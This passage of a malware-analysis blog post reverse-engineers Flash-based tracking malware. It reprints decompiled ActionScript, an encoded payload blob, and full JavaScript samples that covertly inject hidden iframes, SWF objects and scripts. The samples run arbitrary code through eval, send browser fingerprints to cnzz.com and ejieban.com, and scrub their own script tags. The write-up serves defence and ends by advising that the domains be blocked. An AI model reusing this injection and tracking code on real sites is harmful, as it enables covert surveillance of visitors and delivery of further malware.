<pre><code class="language-javascript">fetchit()-&gt;
  fetchcallback()-&gt;
    preappend()-&gt;
      decodeArray()-&gt;
        (BaseCoder).decode([data_from_stat_do])
</code></pre>
<pre><code class="language-java">      private function fetchit() : void
      {
         var _loc1_:String = this.host + &quot;stat2.do?p=&quot; + this.ipStr;
         var _loc2_:URLLoader = new URLLoader();
         _loc2_.dataFormat = URLLoaderDataFormat.TEXT;
         _loc2_.addEventListener(SecurityErrorEvent.SECURITY_ERROR,securityErrorHandler);
         _loc2_.addEventListener(IOErrorEvent.IO_ERROR,ioErrorHandler);
         _loc2_.addEventListener(Event.COMPLETE,this.fetchcallback);
         _loc2_.load(new URLRequest(_loc1_));
      }

      private function fetchcallback(param1:Event) : void
      {
         ...
            this.preappend();
         ...
      }
      private function preappend() : void
      {
         ...
            this.decodeArray(_loc1_.data.oarr);
         ...
      }
      private function decodeArray(param1:String) : void
      {
         var _loc5_:String = null;
         var _loc6_:Array = null;
         var _loc2_:BaseCoder = new BaseCoder();
         var _loc3_:String = _loc2_.decode(param1);
         ...
      }

/* stat.do?p=xyz returns:

IYnsjNqhTNBha5a4M5^^FgG0Mg^Ap_j~
1uOdIYAWz_nwLZfEJN6W5N6ecbB4qu6dcihWnbOQ5jrvLN86jY6hH58wk5chHR8wIiKFZjGvr_pFUjnQr_pFr_pF5byeVRpPzNzGab6WL5KhcRyQ^b6P2u^Pr_pFCN6WcY^m^u^G1RKG5NOGJbhmJbqdUiWdpN6Gr_pFUbrerbDFXtDWajrQXZDgrHph1uOdYYDv^tDW2Z8ECtOgcj6W8jKQzjpwjbKwJRlQ5N6vCb84TYvFUY^6RYBF1t^woYad5NveIiAg5_^PIZA4I_Amc_6w1P8QcuDmCRKwRY865NKGqPcQ^jnQIiAmC_OmkYK6pipw7izwcbhgnbOQBROQ2Z^wcj0gIjAWc_qw8bAdr_pF5_KERNpET_A1i_lwYjDF^tDW2Z8ECtOgLRKhpipw7izwcbhgnbOQqi8Gr_pF7ZpvHZDd^t6W8bDQ^t6W1blGIiAmz_nwLZfEJNgWcY^4^u^G1RKG5NOGJbhmJbqdUiWdpN6Gr_pFT_A1^_Gwciewr_pF2unEDjOFXN6v^NGGciewquew5NOGJb^mjiaFC58WktWsiNrQ5RDPJoOQ^u^Q5NveIiAg^_GwciewB2zGzjFQJb9QUuswoiDP^tvWjZKviu^wjbKGJRlQr_pF^ZXwr_pF2unEDjOFXNBQUN0GUugwaRKwJRlQ5NrQUbXvTiKPYuDeXtDWUbvG2TzkHZpdZN^G2Zp1HbDwl_jmJ7jqr7DWkYnho5a6RYn6pt542RDP7Nze2bOGIbpmLypF2NOe2HWvcuewY_QFl_5m2RDP7NOecZXw1_1Fp5542RDP7Nze2bOGIbpmz_mm^taWI36Pr_pF2unEDjOFYNWv1NDequew5NOGJb6m1ZndYuOwLYWFY5q6LiQs^YzsViXsct64RZDQ^t6WoiDPXtDW^tyWzPqQouDw^tDW2Z8ECtOgkYK6pipw7izwcbhgnbOQBROQ2Z^wIjKeYuDe^tQWTRIPRPJvJNyqUupEniDFawAqDPpml_CFX7O4cu^mU3hd2_OdURlvcinw5NOGlbpQXiAmRPMvUihd2b^Q7U7UJolQJjKdcinwJ_Q11wZ6p_js87eqItAWz_6mBbQg_o~~
*/
</code></pre>
<p>The next step is to run this data through the custom base64 decoding routine but debuging the decoded SWF inside FFDec once again proved to be a challenge.</p>
<p>There is no <code>ExternalInterface</code> API available to the standalone Flash debugger. The SWF code specifically checks for <code>ExternalInterface</code> and will exit if it doesn&rsquo;t exist. There are two ways I can approach this.</p>
<p>First option: I could modify the SWF bytecode to remove the check for <code>ExternalInterface</code> so I can walk through the decoding routine in the FFDec debugger:</p>
<p><img src="/images/2016/10/remove_bytecode.PNG" alt=""></p>
<p>While this does bypass the check, the variable watch did not seem to work properly on my system. I did try Flash 23 and Flash 18 debuggers but walking through code, I could not see the contents of variables in memory.</p>
<p>The second option:</p>
<ul>
<li>Create a new ActionScript project in <a href="http://www.flashdevelop.org/">FlashDevelop</a></li>
<li>add <code>BaseCoder.as</code> to the project</li>
<li>populate the Main class with the base64 data I want to decode (variables: <code>ss</code>,  <code>from\_stat\_do\_1</code>, <code>from\_stat\_do\_2</code>)</li>
<li>compile and execute the SWF in Firefox</li>
<li>check the console log for the decoded data</li>
</ul>
<p><img src="/images/2016/10/decoder_fla.PNG" alt=""></p>
<p>More JavaScript and SWF files referenced in the base64 decoded data:</p>
<p><img src="/images/2016/10/decoded_in_console_log.PNG" alt=""></p>
<p>The JavaScript code is fairly simple and looks to provide a <code>_stat</code> object that allows the malware to inject more SWF, JavaScript and IMG tags:</p>
<pre><code class="language-javascript">(function() {
    window._stat = [];
    var d = document;
    _stat.fd = &quot;&quot;;
    _stat.wtc = 0;
    _stat.fin = function(fd) {
        _stat.wtc = 0;
        if (d[&quot;s_stat&quot;] &amp;&amp; d[&quot;s_stat&quot;].fin) {
            d[&quot;s_stat&quot;].fin(fd)
        }
    };
    _stat.delay = function(fd) {
        if (_stat.fd == fd) _stat.wtc = 0
    };
    _stat.wt = function(fd, fn, sol, sn, v, p) {
        if (d[fd] &amp;&amp; d[fd].document &amp;&amp; d[fd].document[&quot;s_stat&quot;] &amp;&amp; d[fd].document[&quot;s_stat&quot;][fn]) {
            try {
                if (p &amp;&amp; &quot;&quot; != p) {
                    eval('d[fd].document[&quot;s_stat&quot;][fn]' + p)
                } else {
                    d[fd].document[&quot;s_stat&quot;][fn](sol, sn, v)
                }
            } catch (e) {}
            _stat.fin(fd)
        } else {
            _stat.fd = fd;
            _stat.wtc++;
            if (_stat.wtc &gt; 70) _stat.fin(fd);
            else setTimeout(function() {
                _stat.wt(fd, fn, sol, sn, v, p)
            }, 500)
        }
    };
    _stat.ss = &quot;(function(d,w,c){try{if(c!=\&quot;\&quot;){if(c.indexOf(\&quot;.s\&quot;+\&quot;wf\&quot;)&gt;-1){var fp=c;var pm=\&quot;\&quot;;var fd=\&quot;s_stat\&quot;;var x=c.indexOf(\&quot;!\&quot;);if(x&gt;-1){fp=c.substr(0,x);pm=c.substr(x+1);};var str='&lt;object id=\&quot;'+fd+'\&quot; name=\&quot;'+fd+'\&quot; classid=\&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000\&quot; codebase=\&quot;http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,0,0\&quot; width=\&quot;1\&quot; height=\&quot;1\&quot;&gt;&lt;param name=\&quot;allowScriptAccess\&quot; value=\&quot;always\&quot;/&gt;&lt;param name=\&quot;movie\&quot; value=\&quot;'+fp+'\&quot;/&gt;&lt;param name=\&quot;flashVars\&quot; value=\&quot;'+pm+'\&quot;/&gt;&lt;embed id=\&quot;'+fd+'\&quot; name=\&quot;'+fd+'\&quot; src=\&quot;'+fp+'\&quot; flashVars=\&quot;'+pm+'\&quot; width=\&quot;1\&quot; height=\&quot;1\&quot; allowScriptAccess=\&quot;always\&quot; type=\&quot;application/x-shockwave-flash\&quot; pluginspage=\&quot;http://www.macromedia.com/go/getflashplayer\&quot; /&gt;&lt;/object&gt;';d.body.appendChild(d.createElement('DIV')).innerHTML=str}else{d.getElementsByTagName('HEAD')[0].appendChild(d.createElement('SCRIPT')).src=c+'.js'}}}catch(e){}})&quot;;
    _stat.apdiv = function(fd, h) {
        var n = d.createElement('DIV');
        n.style.width = &quot;0&quot;;
        n.style.height = &quot;0&quot;;
        n.style.position = &quot;absolute&quot;;
        n.style.left = &quot;-100px&quot;;
        _stat[&quot;div&quot; + fd] = n;
        n.innerHTML = h;
        d.body.appendChild(n)
    };
    _stat.apfd = function(fd, url) {
        var str = '&lt;iframe id=&quot;' + fd + '&quot; name=&quot;' + fd + '&quot; src=&quot;' + url + '&quot; width=&quot;1&quot; height=&quot;1&quot;/&gt;';
        _stat.apdiv(fd, str)
    };
    _stat.apjs = function(fd, txt) {
        try {
            var calleval = d[fd].window.execScript || d[fd].window.eval;
            calleval(txt)
        } catch (e) {}
    };
    _stat.ap = function(fd, fp, js, t) {
        if (1 == t) {
            _stat.apfd(fd, &quot;about:blank&quot;);
            setTimeout(function() {
                _stat.apjs(fd, _stat.ss + &quot;(document, window, '&quot; + fp + &quot;');&quot; + js)
            }, 1000)
        } else {
            _stat.apfd(fd, &quot;stat.html#&quot; + fp);
            if (js &amp;&amp; '' != js) setTimeout(function() {
                _stat.apjs(fd, js)
            }, 1000)
        }
    };
    _stat.rm = function(fd) {
        d.body.removeChild(_stat[&quot;div&quot; + fd]);
        _stat[&quot;div&quot; + fd] = null
    };
    _stat.zz = function(id, r) {
        var l = &quot;http://hzs11.cnzz.com/stat.htm?id=&quot;;
        l += id + &quot;&amp;r=&quot; + encodeURIComponent(r) + &quot;&amp;lg=&quot;;
        var f = window;
        var lg = f.navigator.systemLanguage || f.navigator.language;
        l += lg.toLowerCase() + &quot;&amp;ntime=none&amp;repeatip=0&amp;rtime=0&amp;cnzz_eid=&quot;;
        l += Math.floor(2147483648 * Math.random()) + &quot;-1395926171-&quot;;
        var sp = f.screen.width &amp;&amp; f.screen.height ? f.screen.width + &quot;x&quot; + f.screen.height : &quot;0x0&quot;;
        l += &quot;&amp;showp=&quot; + sp + &quot;&amp;st=0&amp;sin=&amp;t=&amp;rnd=&quot; + Math.floor(2147483648 * Math.random());
        var img = '&lt;img src=&quot;' + l + '&quot; width=&quot;0&quot; height=&quot;0&quot;/&gt;';
        return img
    };
    _stat.st = function(l) {
        var id = &quot;zz&quot; + (new Date()).getTime();
        var h = _stat.zz('1743600', l || document.referrer);
        _stat.apdiv(id, h);
        setTimeout(function() {
            try {
                _stat.rm(id)
            } catch (e) {}
        }, 1500)
    }
})();
</code></pre>
<p>The second line is the client IP and country of origin of the request in Chinese.</p>
<p><code>184.75.214.86_[Canada]:</code></p>
<p><img src="/images/2016/10/translate.PNG" alt=""></p>
<p>The third is another array of SWFs, JavaScript files, commands and callback URLs. The decoded stat.swf will process this data and inject it into the page using the <code>fetchcallback</code> function (see above).</p>
<p>Files of Note</p>
<p><code>hxxp://s.ssl.qhimg.com/ssl/002735e0619ae0d8.swf</code></p>
<p><img src="/images/2016/10/cookie_handler.png" alt=""></p>
<p>This SWF looks to provide <code>get/set/remove</code> functionality via the SharedObject API to the browser. This would allow Flash files injected in the same page to share data using memory instead of requiring a separate server for communication.</p>
<p><code>hxxp://y3.ifengimg.com/ed787/0912/flashCookie.swf</code></p>
<p><img src="/images/2016/10/flashCookie-swf_contents.PNG" alt=""></p>
<p>This provides similar functionality via the SharedObject API.</p>
<p>The data received from <code>stat.do</code> also references a few JavaScript files which appear to provide more tracking functionality.</p>
<p><code>hxxp://b0.ejieban.com/clouder.js,  hxxp://i1.ejieban.com/clouder.js,  hxxp://31.ejieban.com/clouderx.js:</code></p>
<pre><code class="language-javascript">if (&quot;undefined&quot; == typeof(_c1oud3r)) {
    _c1oud3r = [];
    _c1oud3r.nodes = [];
    _c1oud3r._5c = false;
    _c1oud3r.pt = ((&quot;https:&quot; == window.location.protocol) ? &quot;https://&quot; : &quot;http://&quot;);
    _c1oud3r.appendChild = function(html, id) {
        var node = document.createElement(&quot;DIV&quot;);
        node.style.width = &quot;0&quot;;
        node.style.height = &quot;0&quot;;
        node.style.position = &quot;absolute&quot;;
        node.style.left = &quot;-100px&quot;;
        node.innerHTML = html;
        document.body.appendChild(node);
        _c1oud3r.nodes[id] = node
    };
    _c1oud3r.removeNode = function(id) {
        try {
            if (_c1oud3r.nodes[id]) {
                document.body.removeChild(_c1oud3r.nodes[id]);
                _c1oud3r.nodes[id] = undefined
            }
        } catch (e) {}
    };
    _c1oud3r.removeIt = function() {
        if (_c1oud3r._5c) {
            setTimeout(&quot;_c1oud3r.removeNode('_cl3r')&quot;, 1200)
        } else {
            setTimeout(_c1oud3r.removeIt, 1000)
        }
    };
    _c1oud3r.stat = function(id, r) {
        var l = _c1oud3r.pt + &quot;hzs11.cnzz.com/stat.htm?id=&quot;;
        l += id + &quot;&amp;r=&quot; + encodeURIComponent(r) + &quot;&amp;lg=&quot;;
        var f = window;
        var lg = f.navigator.systemLanguage || f.navigator.language;
        l += lg.toLowerCase() + &quot;&amp;ntime=none&amp;repeatip=0&amp;rtime=0&amp;cnzz_eid=&quot;;
        l += Math.floor(2147483648 * Math.random()) + &quot;-1395926171-&quot;;
        var sp = f.screen.width &amp;&amp; f.screen.height ? f.screen.width + &quot;x&quot; + f.screen.height : &quot;0x0&quot;;
        l += &quot;&amp;showp=&quot; + sp + &quot;&amp;st=0&amp;sin=&amp;t=&amp;rnd=&quot; + Math.floor(2147483648 * Math.random());
        return l
    };
    _c1oud3r.kbehavi = function() {
        if (&quot;undefined&quot; != typeof(LogHub) &amp;&amp; &quot;undefined&quot; != typeof(LogHub.behavior)) {
            LogHub.sbehavior = LogHub.behavior;
            LogHub.behavior = function(t, n) {
                if (/e\wie\wan\.\wom/i.test(n)) return;
                LogHub.sbehavior(t, n)
            }
        } else {
            setTimeout(_c1oud3r.kbehavi, 200)
        }
    };
    _c1oud3r.oload = function() {
        if (document.body == null) {
            setTimeout(_c1oud3r.oload, 200)
        } else {
            var fp = _c1oud3r.pt + &quot;s0.ejieban.com/stat.swf?d=17.swf&quot;;
            var pm = &quot;f=3h&amp;u=&quot; + window.navigator.userAgent;
            if (&quot;undefined&quot; != typeof(__scode)) {
                pm += &quot;&amp;&quot; + __scode
            }
            var str = '&lt;object classid=&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&quot; codebase=' + _c1oud3r.pt + 'fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,0,0&quot; width=&quot;0&quot; height=&quot;0&quot;&gt;&lt;param name=&quot;allowScriptAccess&quot; value=&quot;always&quot;/&gt;&lt;param name=&quot;movie&quot; value=&quot;' + fp + '&quot;/&gt;&lt;param name=&quot;flashVars&quot; value=&quot;' + pm + '&quot;/&gt;&lt;embed src=&quot;' + fp + '&quot; flashVars=&quot;' + pm + '&quot; width=&quot;0&quot; height=&quot;0&quot; allowScriptAccess=&quot;always&quot; type=&quot;application/x-shockwave-flash&quot; pluginspage=&quot;' + _c1oud3r.pt + 'www.macromedia.com/go/getflashplayer&quot; /&gt;&lt;/object&gt;';
            str += '&lt;img src=&quot;' + _c1oud3r.stat(&quot;1806840&quot;, document.referrer) + '&quot; width=&quot;0&quot; height=&quot;0&quot;/&gt;';
            _c1oud3r.appendChild(str, &quot;_cl3r&quot;);
            setTimeout(_c1oud3r.removeIt, 2000)
        }
    };
    try {
        if (&quot;complete&quot; == document.readyState) {
            _c1oud3r.oload()
        } else {
            if (document.attachEvent) {
                window.attachEvent(&quot;onload&quot;, _c1oud3r.oload)
            } else {
                window.addEventListener(&quot;load&quot;, _c1oud3r.oload, false)
            }
        }
    } catch (e) {}
    _c1oud3r.kbehavi()
}
// &quot;clouder&quot; sample 2
if (&quot;undefined&quot; == typeof(_c1oud3r)) {
    _c1oud3r = [];
    _c1oud3r.nodes = [];
    _c1oud3r.pt = ((&quot;https:&quot; == window.location.protocol) ? &quot;https://&quot; : &quot;http://&quot;);
    _c1oud3r.appendChild = function(html, id) {
        var node = document.createElement(&quot;DIV&quot;);
        node.style.width = &quot;0&quot;;
        node.style.height = &quot;0&quot;;
        node.style.position = &quot;absolute&quot;;
        node.style.left = &quot;-100px&quot;;
        node.innerHTML = html;
        document.body.appendChild(node);
        _c1oud3r.nodes[id] = node
    };
    _c1oud3r.removeNode = function(id) {
        try {
            if (_c1oud3r.nodes[id]) {
                document.body.removeChild(_c1oud3r.nodes[id]);
                _c1oud3r.nodes[id] = undefined
            }
        } catch (e) {}
    };
    _c1oud3r.removeScript = function() {
        var head = document.getElementsByTagName('HEAD')[0];
        var ss = head.getElementsByTagName('SCRIPT');
        var re = new RegExp(&quot;//[^/]*\\.ejieban\\.com/&quot;, &quot;i&quot;);
        for (var i = (ss.length - 1); i &gt;= 0; i--) {
            if (re.test(ss[i].src)) {
                head.removeChild(ss[i])
            }
        }
    };
    _c1oud3r.stat = function(id, r) {
        var l = _c1oud3r.pt + &quot;hzs11.cnzz.com/stat.htm?id=&quot;;
        l += id + &quot;&amp;r=&quot; + encodeURIComponent(r) + &quot;&amp;lg=&quot;;
        var f = window;
        var lg = f.navigator.systemLanguage || f.navigator.language;
        l += lg.toLowerCase() + &quot;&amp;ntime=none&amp;repeatip=0&amp;rtime=0&amp;cnzz_eid=&quot;;
        l += Math.floor(2147483648 * Math.random()) + &quot;-1395926171-&quot;;
        var sp = f.screen.width &amp;&amp; f.screen.height ? f.screen.width + &quot;x&quot; + f.screen.height : &quot;0x0&quot;;
        l += &quot;&amp;showp=&quot; + sp + &quot;&amp;st=0&amp;sin=&amp;t=&amp;rnd=&quot; + Math.floor(2147483648 * Math.random());
        return l
    };
    _c1oud3r.oload = function() {
        if (document.body == null) {
            setTimeout(_c1oud3r.oload, 200)
        } else {
            var str = '&lt;img src=&quot;' + _c1oud3r.stat(&quot;1568238&quot;, document.referrer) + '&quot; width=&quot;0&quot; height=&quot;0&quot;/&gt;';
            _c1oud3r.appendChild(str, &quot;_cl3r&quot;);
            _c1oud3r.removeScript();
            setTimeout(&quot;_c1oud3r.removeNode('_cl3r')&quot;, 2000)
        }
    };
    try {
        if (&quot;complete&quot; == document.readyState) {
            _c1oud3r.oload()
        } else {
            if (document.attachEvent) {
                window.attachEvent(&quot;onload&quot;, _c1oud3r.oload)
            } else {
                window.addEventListener(&quot;load&quot;, _c1oud3r.oload, false)
            }
        }
    } catch (e) {}
}
</code></pre>
<h2 id="conclusions">Conclusions</h2>
<p>This piece of malware does not appear to attempt privilege escalation or PE payload download (ala Neutrino EK). Its primary purpose appears to be tracking via <code>cnzz.com</code> and <code>ejieban.com</code> using <code>&lt;script&gt;</code>, <code>&lt;img&gt;</code>, Flash <code>&lt;object&gt;</code> injection.</p>
<p>It&rsquo;s important to note that since it has the ability to inject arbitrary Flash and JavaScript data, it can deliver EKs or other malware. The tracking functionality could theoretically be used to target very specific clients by country, IP range or any of the other meta data it collects.</p>
<p>It&rsquo;s probably a good idea to block the domains above.</p>

            </div>
        </article>

        <hr />

        <div class="post-info">
  				<p>
  					<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="/tags/malware">Malware</a></span><span class="tag"><a href="/tags/malware-analysis">Malware Analysis</a></span><span class="tag"><a href="/tags/flash">Flash</a></span><span class="tag"><a href="/tags/swf">SWF</a></span><span class="tag"><a href="/tags/reverse-engineering">Reverse Engineering</a></span>
  				</p>
  			</div>

        
    </main>

            </div>

            
                <footer class="footer">
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2021</span>
            
                <span><a href="/">Bit Therapy</a></span>
            
            <span>_</span>
            <span> <a href="/post/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
        </div>
    </div>
    <div class="footer__inner">
        <div class="footer__content">

        </div>
    </div>
    <div class="footer__inner">
        <div class="footer__content">
            ...
        </div>
    </div>
</footer>

            
        </div>

        




<script type="text/javascript" src="/bundle.min.766584e6ea536f54faf86b018d73f719fc520199a6c4d32cbd959eb87634c11b380ac646d80d67304313aac0f5f05e6715221bd99a619bbc905365b55f78147f.js" integrity="sha512-dmWE5upTb1T6&#43;GsBjXP3GfxSAZmmxNMsvZWeuHY0wRs4CsZG2A1nMEMTqsD18F5nFSIb2Zphm7yQU2W1X3gUfw=="></script>



    </body>
</html>
